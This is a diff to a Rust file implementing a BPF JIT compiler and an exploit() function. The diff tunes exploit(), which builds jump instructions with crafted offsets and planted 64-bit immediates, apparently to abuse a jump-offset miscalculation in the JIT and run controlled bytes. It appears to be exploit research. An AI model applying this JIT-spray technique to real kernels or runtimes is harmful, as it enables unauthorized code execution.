@@ -836,6 +836,8 @@ pub fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u
 
     println!("BpfJa offsets: {:?}", ja_offsets);
     println!("ilens: {:?}", ilens);
+    // let addrs2: Vec<u32> = addrs.iter().map(|it| if *it == 0  { 0} else {it - PROLOGUELEN as u32}).collect();
+    // println!("addrs: {:?}", addrs2);
 
     if let Some(ref mut oimg) = outimg {
         oimg[clen..clen+EPILOGUELEN].copy_from_slice(&EPILOGUE);
@@ -1043,19 +1045,32 @@ fn exploit() {
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });
 
     // shrink 1
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
+    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
 
     for _ in 0..11 {
         add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
     }
 
     let n = 9;
-    for _ in 0..n {
-        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    for i in 0..n {
+        if i == 0 {
+            // off: 16 + 2|5 + 100 + 8 bytes
+            instructions.push(BpfInstT { opc: 5, regs: 0, off: (n-1) + 1 + 10*2 + 4, imm: 0 });
+        } else {
+            instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+        }
     }
 
     // off: 2|5 2 10
     instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - n - 10*2, imm: 0 });
+
+    for _ in 0..10 {
+        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
+    }
+    for _ in 0..8 {
+        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    }
 
     run(&instructions);
 }
